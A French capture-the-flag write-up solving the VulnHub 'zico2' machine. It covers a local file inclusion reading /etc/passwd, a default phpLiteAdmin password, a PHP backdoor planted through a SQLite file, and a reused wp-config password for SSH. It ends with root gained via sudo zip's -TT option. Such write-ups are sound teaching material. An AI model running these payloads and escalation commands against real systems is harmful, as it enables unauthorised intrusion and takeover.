# Solution du CTF zico2: 1 de VulnHub

Nitro
-----

[zico2](https://www.vulnhub.com/entry/zico2-1,210/) est un CTF boot-2-root créé par [Rafael Santos](https://twitter.com/rafasantos5) et disponible sur VulnHub.  

Le synopsis est le suivant :  

> Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?

Toc toc
-------

Nmap trouve les ports suivants sur la VM :  

```plain
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          49368/tcp  status
|_  100024  1          50813/udp  status
49368/tcp open  status  1 (RPC #100024)
```

Sur le port 80 se trouve un site quasi vide mais qui présente bien (bootstrap, jquery, fontawesome, ...)  

On note toutefois une URL *http://192.168.1.47/view.php?page=tools.html* qui laisse présager une faille d'inclusion ou juste un directory traversal.  

Monkey see
----------

Après avoir joué un peu avec cette URL on voit que les inclusions distantes et les chemins absolus ne fonctionnent pas mais les chemins relatifs fonctionnent.  

Ainsi l'URL *http://192.168.1.47/view.php?page=../../../../../../../../../../../../../etc/passwd* nous retourne le contenu suivant :  

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ntp:x:103:108::/home/ntp:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
zico:x:1000:1000:,,,:/home/zico:/bin/bash
```

Face à une telle vulnérabilité l'objectif est d'abord de déterminer où l'on se trouve sur le système (quel est le working directory du script) et d'obtenir des informations sur la configuration du serveur (config Apache et PHP).  

En l’occurrence si on passe juste *../../etc/passwd* on obtient toujours le contenu attendu, ce qui montre que seuls deux dossiers nous séparent de la racine. On peut être dans un */var/www* ou */srv/htdocs*.  

L'entrée du fichier *passwd* pour l'utilisateur *www-data* permet de confirmer que l'on est dans */var/www*.  

Maintenant que l'on sait où l'on est, il faut trouver une fonctionnalité permettant de placer du contenu sur le disque du serveur afin de provoquer son inclusion.  

Je lance un scan de dossiers sur le serveur web et quelques entrées apparaissent :  

```plain
  `==\. dvbuster v1.0 ./=='
      ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
20468 lines to process.
as many requests to send.
Using 4 processes...
Server banner: Apache/2.2.22 (Ubuntu)

Starting buster processes...
http://192.168.1.47/.htaccess/ - HTTP 403 (238 bytes, gzip)
http://192.168.1.47/.htpasswd/ - HTTP 403 (241 bytes, gzip)
http://192.168.1.47/cgi-bin/ - HTTP 403 (240 bytes, gzip)
http://192.168.1.47/css/ - HTTP 200 (468 bytes, gzip) - Directory listing found
http://192.168.1.47/dbadmin/ - HTTP 200 (455 bytes, gzip) - Directory listing found
http://192.168.1.47/doc/ - HTTP 403 (237 bytes, gzip)
http://192.168.1.47/icons/ - HTTP 403 (238 bytes, gzip)
http://192.168.1.47/img/ - HTTP 200 (474 bytes, gzip) - Directory listing found
http://192.168.1.47/js/ - HTTP 200 (467 bytes, gzip) - Directory listing found
http://192.168.1.47/server-status/ - HTTP 403 (240 bytes, gzip)
http://192.168.1.47/vendor/ - HTTP 200 (506 bytes, gzip) - Directory listing found
http://192.168.1.47/view/ - HTTP 200 (20 bytes, gzip)
100% - DONE
100% ~user/                        Duration: 0:00:22.138620
```

Le dossier *dbadmin* est intéressant : il renferme un script *test\_db.php* qui est une mire de login pour *phpLiteAdmin v1.9.3*.  

Ces webapps ont parfois des mots de passe par défaut donc je tente rapidement le mot de passe *admin* et hop! connecté :)   

Au passage l'inclusion de *dbadmin/test\_db.php* retourne la mire de connexion telle qu'elle est si on y accède directement et pas du code PHP, preuve que l'on est en face d'une faille d'inclusion et non un simple directory traversal.  

Dans l'interface de *phpLiteAdmin* est listée une base de donnée à l'emplacement */usr/databases/test\_users*. Il s'agit d'une base sqlite.  

Une table *info* est présente avec trois colonnes : *id*, *name*, et *pass*. On trouve deux enregistrements :  

```plain
root	653F4B285089453FE00E2AAFAC573414
zico	96781A607F4E9F5F423AC01F0DAB0EBD
```

Google permet de retrouver facilement le password correspondant au premier hash (*34kroot34*). Malheureusement il ne permet ni d'accéder au compte *zico* ni à root :(   

Monkey write
------------

Mais on a au moins la possibilité d'écrire dans la base de données sqlite et donc sur le disque du serveur. Je créé donc une table avec seulement un champ TEXT et une entrée *<?php phpinfo(); ?>*  

L'accès à l'URL *http://192.168.1.47/view.php?page=../../usr/databases/test\_users* nous retourne bien le *phpinfo()*  

On efface la nouvelle table et on en recrée une qui fait une backdoor *system()*.  

![php backdoor via sqlite DB file](https://raw.githubusercontent.com/devl00p/blog/master/images/zico2_phpliteadmin.png)

Via cet accès on découvre que le dossier */var/www* est accessible par root uniquement donc on ne peut pas créer de fichier *.ssh/authorized\_keys*.  

Toutefois les sous-dossiers sont eux accessibles et peuvent nous servir pour déposer ou récupérer des fichiers facilement.  

Le dossier de l'utilisateur *zico* est lisible et bourré de sources de webapps. Je recherche dans le listing les fichiers avec config dans le nom. Assez rapidement je me tourne vers le *wp-config* (fichier de configuration de *Wordpress*)  

Monkey get a shell
------------------

On trouve un mot de passe dans le fichier de configuration qui est réutilisé pour le compte SSH :  

```php
/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
```

```plain
zico@zico:~$ id
uid=1000(zico) gid=1000(zico) groups=1000(zico)
```

Malheureusement le mot de passe cassé plus tôt (*34kroot34*) n'est pas réutilisé pour le compte root.  

Monkey g0t root
---------------

L'utilisateur zico a l'autorisation de lancer deux programmes d'archivage avec les droits root :  

```plain
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

Il y a t-il un moyen de faire exécuter des commandes à l'un de ces deux programmes ? La page de manuel de zip nous donne une solution :  

```plain
-TT cmd
--unzip-command cmd
        Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, to use a copy of unzip in the current directory instead  of  the  standard system unzip, could use:

        zip archive file1 file2 -T -TT "./unzip -tqq"

        In  cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command.  The return code is checked for success (0 on Unix).
```

Plus qu'à récupérer le flag :  

```plain
zico@zico:~$ sudo zip archive /etc/issue -T -TT "ls /root -al"
  adding: etc/issue (stored 0%)
-rw------- 1 root root  169 Oct 20 16:44 zifzgKZx

/root:
total 44
drwx------  4 root root 4096 Jun 19 11:59 .
drwxr-xr-x 24 root root 4096 Jun  1 18:54 ..
-rw-------  1 root root 5723 Jun 19 12:09 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Jun  1 20:15 .cache
-rw-r--r--  1 root root   75 Jun 19 11:55 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwxr-xr-x  2 root root 4096 Jun  8 14:02 .vim
-rw-------  1 root root 5963 Jun 19 11:59 .viminfo
test of archive.zip OK

zico@zico:~$ sudo zip archive /etc/issue -T -TT "cat /root/flag.txt"
  adding: etc/issue (stored 0%)
#
#
#
# ROOOOT!
# You did it! Congratz!
#
# Hope you enjoyed!
#
#
#
#
```

Cette solution est sans doute un peu maladroite dans le sens où il suffit de zipper le dossier /root puis le dézipper pour récupérer le flag. Mais c'était plus marrant de cette manière :)

*Published October 20 2017 at 20:10*